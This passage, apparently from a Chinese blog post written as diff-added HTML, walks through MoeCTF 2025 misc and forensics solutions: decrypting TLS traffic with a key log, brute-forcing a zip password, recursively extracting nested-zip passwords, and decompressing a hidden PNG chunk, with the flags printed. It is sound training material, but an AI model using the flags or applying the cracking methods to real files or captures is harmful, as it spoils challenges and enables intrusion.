+	srcset="/p/moectf_2025/23_hu_d1e3e3c8eddc72d7.png 480w, /p/moectf_2025/23_hu_4a8b16f2433944bf.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="438px"
+	
+></p>
+<p><img src="/p/moectf_2025/24.png"
+	width="1309"
+	height="160"
+	srcset="/p/moectf_2025/24_hu_95c22b3453da027c.png 480w, /p/moectf_2025/24_hu_818245902acef447.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="818"
+		data-flex-basis="1963px"
+	
+></p>
+<p><img src="/p/moectf_2025/25.png"
+	width="1050"
+	height="195"
+	srcset="/p/moectf_2025/25_hu_f9a720d8067cc33a.png 480w, /p/moectf_2025/25_hu_d7413e3c77f5ce70.png 1024w"
+	loading="lazy"
+	
+		alt="8950的文件头：png图片文件标识"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="538"
+		data-flex-basis="1292px"
+	
+></p>
+<p><img src="/p/moectf_2025/26.png"
+	width="1216"
+	height="402"
+	srcset="/p/moectf_2025/26_hu_e35f0a90ec07b64f.png 480w, /p/moectf_2025/26_hu_304f0816ee56e2b8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="725px"
+	
+></p>
+<p>导出为png图片：</p>
+<p><img src="/p/moectf_2025/27.png"
+	width="965"
+	height="367"
+	srcset="/p/moectf_2025/27_hu_12bd2d097946a1cd.png 480w, /p/moectf_2025/27_hu_a613b5a07cf21f80.png 1024w"
+	loading="lazy"
+	
+		alt="Minecraft附魔台图片"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="262"
+		data-flex-basis="631px"
+	
+></p>
+<p>根据附魔台咒语的编码表去对应转译：now_you_have_mastered_enchanting</p>
+<p><img src="/p/moectf_2025/28.png"
+	width="722"
+	height="148"
+	srcset="/p/moectf_2025/28_hu_44df19c91380fb4b.png 480w, /p/moectf_2025/28_hu_bab4944083ab1e36.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="487"
+		data-flex-basis="1170px"
+	
+></p>
+<p>moectf{now_you_have_mastered_enchanting}</p>
+<p>这题挺有意思的，不愧是杂项啊，脑洞真的厉害啊。</p>
+<h3 id="webrepo">WebRepo
+</h3><hr>
+<p>这都是什么稀奇古怪的格式！？</p>
+<hr>
+<p><img src="/p/moectf_2025/WebRepo.webp"
+	width="768"
+	height="768"
+	srcset="/p/moectf_2025/WebRepo_hu_674c9e820f2f3016.webp 480w, /p/moectf_2025/WebRepo_hu_1f066acfaf931746.webp 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="100"
+		data-flex-basis="240px"
+	
+>扫完后发现：“Flag is not here, but I can give you a hint: Use binwalk.”</p>
+<p>用binwalk提取看看，很奇怪我的Kali和随波逐流工具的binwalk都提取不出来，试试010editor手工提取，这题我不会，复现别人WP，为什么别人可以提取我不能</p>
+<p>/(ㄒoㄒ)/~~</p>
+<p>moectf{B1NwA1K_ANd_g1t_R3seT-MaG1C}</p>
+<h3 id="ez_ssl">ez_ssl
+</h3><hr>
+<p>zero6six 在网页内上传了一份秘密文件。望着浏览器提示的“连接安全，信息不会外泄”，他觉得万无一失。</p>
+<p>但与此同时，他的浏览器却悄悄上传了另一份文件。</p>
+<p>现在把他电脑的抓包记录给你，你能破解他的秘密吗？</p>
+<hr>
+<p><img src="/p/moectf_2025/29.png"
+	width="1596"
+	height="816"
+	srcset="/p/moectf_2025/29_hu_b95683d3c159cf06.png 480w, /p/moectf_2025/29_hu_125a8cac33b1c555.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="469px"
+	
+></p>
+<p>进一步查看发现是一个ssl.log的文件</p>
+<p><img src="/p/moectf_2025/30.png"
+	width="920"
+	height="250"
+	srcset="/p/moectf_2025/30_hu_85253e618e86798f.png 480w, /p/moectf_2025/30_hu_6288e4a38e904c56.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="368"
+		data-flex-basis="883px"
+	
+></p>
+<p>然后在 <code>编辑-首选项-Protocols-TLS</code> 处的 <code>(Pre)-Master-Secret log filename</code> 选择保存下来的 ssl.log，解密 SSL 流量后可以发现另一个上传文件的 HTTP 数据包，用上述方法提取到 flag.zip。</p>
+<p><img src="/p/moectf_2025/31.png"
+	width="975"
+	height="544"
+	srcset="/p/moectf_2025/31_hu_4a4ffb8efea6c07f.png 480w, /p/moectf_2025/31_hu_2d15a5f2335f5cd7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="179"
+		data-flex-basis="430px"
+	
+></p>
+<p>解密完就看到ZIP：</p>
+<p><img src="/p/moectf_2025/32.png"
+	width="1295"
+	height="440"
+	srcset="/p/moectf_2025/32_hu_a5dbc3c61954eb64.png 480w, /p/moectf_2025/32_hu_2f6127ad23b32a87.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="294"
+		data-flex-basis="706px"
+	
+></p>
+<p><img src="/p/moectf_2025/33.png"
+	width="1001"
+	height="220"
+	srcset="/p/moectf_2025/33_hu_17d2fc0bd982e277.png 480w, /p/moectf_2025/33_hu_5df16cad5d98b831.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="455"
+		data-flex-basis="1092px"
+	
+></p>
+<p>用ARCHPR进行7位纯数字密码爆破：</p>
+<p><img src="/p/moectf_2025/34.png"
+	width="564"
+	height="544"
+	srcset="/p/moectf_2025/34_hu_42efc6086bcb68f8.png 480w, /p/moectf_2025/34_hu_35eddb87855f277a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="103"
+		data-flex-basis="248px"
+	
+></p>
+<p>密码：6921682。打开后给了一堆ook编码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解码地址：<a class="link" href="https://stuff.splitbrain.org/ook/index.php"  target="_blank" rel="noopener"
+    >Brainfuck/Text/Ook! obfuscator - deobfuscator. Decode and encode online.</a></p>
+<p>moectf{upI0@d-l0G_TO-DeCrYPT_uploAD}</p>
+<h3 id="万里挑一">万里挑一
+</h3><hr>
+<p>要想冲破封锁，寻得真谛，须从万把钥匙中找出唯一的答案</p>
+<hr>
+<p>这题涉及明文攻击，这题我没做出来，考察脚本编写和明文爆破，用递归方式打开压缩包<code>password.zip</code>，获取密码，然后尝试解压<code>lock.zip</code>参考复现别人的python脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zipfile</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1"># 保存密码的文件</span>
+</span></span><span class="line"><span class="cl"><span class="n">output_file</span> <span class="o">=</span> <span class="s2">&#34;pass.txt&#34;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1"># 递归函数，用于处理嵌套zip</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">extract_passwords</span><span class="p">(</span><span class="n">zip_bytes</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">zip_bytes</span><span class="p">))</span> <span class="k">as</span> <span class="n">z</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">z</span><span class="o">.</span><span class="n">namelist</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">name</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;.zip&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 读取子zip文件的二进制内容</span>
+</span></span><span class="line"><span class="cl">                <span class="n">sub_zip_bytes</span> <span class="o">=</span> <span class="n">z</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 递归调用</span>
+</span></span><span class="line"><span class="cl">                <span class="n">passwords</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">extract_passwords</span><span class="p">(</span><span class="n">sub_zip_bytes</span><span class="p">,</span> <span class="n">level</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">name</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;pwd.txt&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">content</span> <span class="o">=</span> <span class="n">z</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 提取密码部分</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="s2">&#34;The password is:&#34;</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">pwd</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;The password is:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">passwords</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">passwords</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1"># 主程序</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">all_passwords</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;password.zip&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">zip_bytes</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">all_passwords</span> <span class="o">=</span> <span class="n">extract_passwords</span><span class="p">(</span><span class="n">zip_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># 保存到文件</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">pwd</span> <span class="ow">in</span> <span class="n">all_passwords</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pwd</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;已提取 </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">all_passwords</span><span class="p">)</span><span class="si">}</span><span class="s2"> 个密码到 </span><span class="si">{</span><span class="n">output_file</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆破后得出密码是<code>a296a5ec1385f394e8cb</code></p>
+<p>&hellip;这题MISC太难了&hellip;/(ㄒoㄒ)/~~[<a class="link" href="https://forum.fzsz.win/topic/89/moectf-2025-misc-%e4%b8%87%e9%87%8c%e6%8c%91%e4%b8%80-%e9%a2%98%e8%a7%a3-%e8%ae%b0%e5%bd%95%e4%b8%80%e9%81%93%e6%9c%89%e8%b6%a3%e7%9a%84%e9%a2%98%e7%9b%ae"  target="_blank" rel="noopener"
+    >MoeCTF 2025]《Misc 万里挑一》题解——记录一道有趣的题目 | 酸枝论坛</a></p>
+<p>moectf{Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad}</p>
+<h3 id="ez_png">ez_png
+</h3><hr>
+<p>这张平平无奇的图片里藏着一个小秘密。</p>
+<p>秘密不在颜色中，而在文件的骨骼里。</p>
+<p>注意：某些数据段的长短似乎不太协调。</p>
+<hr>
+<p>第一种方法（答案复现）</p>
+<p><img src="/p/moectf_2025/ez_png.png"
+	width="900"
+	height="600"
+	srcset="/p/moectf_2025/ez_png_hu_f2ab9281ec789c44.png 480w, /p/moectf_2025/ez_png_hu_d565ddd0bf548468.png 1024w"
+	loading="lazy"
+	
+		alt="ez_png"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="150"
+		data-flex-basis="360px"
+	
+></p>
+<p>题目已经有提示了，用010editor和TweakPNG工具分析看看吧：</p>
+<p><img src="/p/moectf_2025/35.png"
+	width="1140"
+	height="599"
+	srcset="/p/moectf_2025/35_hu_b1ef1bb9d284cfe4.png 480w, /p/moectf_2025/35_hu_5ce6aca3408148.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="190"
+		data-flex-basis="456px"
+	
+></p>
+<p>使用 TweakPNG 发现倒数第二个 IDAT 块没填满就创建了个新的 IDAT 块，且新的块长度很小。</p>
+<p>很明显这应该是人为非法注入的。</p>
+<p><img src="/p/moectf_2025/36.png"
+	width="905"
+	height="170"
+	srcset="/p/moectf_2025/36_hu_fb81651dc1cf61c.png 480w, /p/moectf_2025/36_hu_5fed0a9acf47ae50.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="532"
+		data-flex-basis="1277px"
+	
+></p>
+<p>使用 010 Editor 提取这个 IDAT 块的 data 部分，使用如下脚本解压。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import binascii
+</span></span><span class="line"><span class="cl">import zlib
+</span></span><span class="line"><span class="cl">formatted_hex = &#34;78 9C CB CD 4F 4D 2E 49 AB CE 30 74 49 71 CD 8B 0F 30 89 CC F1 4F 74 89 F7 F4 D3 F5 4C 31 09 A9 05 00 A8 D0 0A 5F&#34;
+</span></span><span class="line"><span class="cl">compressed_hex = formatted_hex.replace(&#34; &#34;, &#34;&#34;)
+</span></span><span class="line"><span class="cl">compressed_data = binascii.unhexlify(compressed_hex)
+</span></span><span class="line"><span class="cl">depressed_data = zlib.decompress(compressed_data)
+</span></span><span class="line"><span class="cl">print(&#34;Decompressed Data:&#34;, depressed_data.decode())
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第二种办法就是binwalk提取，我一开始试了一试，没想到真出来了，我还以为是非预期解呢。</p>
+<p><img src="/p/moectf_2025/37.png"
+	width="1004"
+	height="265"
+	srcset="/p/moectf_2025/37_hu_6d250500af9a0f6e.png 480w, /p/moectf_2025/37_hu_b13da7a525954ffd.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="378"
+		data-flex-basis="909px"
+	
+>moectf{h1DdEn_P4YlOaD_IN-Id4T}</p>
+<p>我的杂项就只会这么多了，剩下的我是真不会了，转PWN了太久没搞杂项了有点生疏了。</p>
+<h2 id="密码学">密码学
+</h2><p><a class="link" href="crypto_in_ctfru_men_zhi_bei_-moectf2025.pdf" >crypto_in_ctfru_men_zhi_bei_-moectf2025.pdf</a></p>
+<p>这是密码学的签到题，请阅读密码学入门指北，开启密码学的旅途吧！</p>
+<hr>
+<p>直接给官方WP版本的脚本吧，太简单了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
+</span></span><span class="line"><span class="cl">
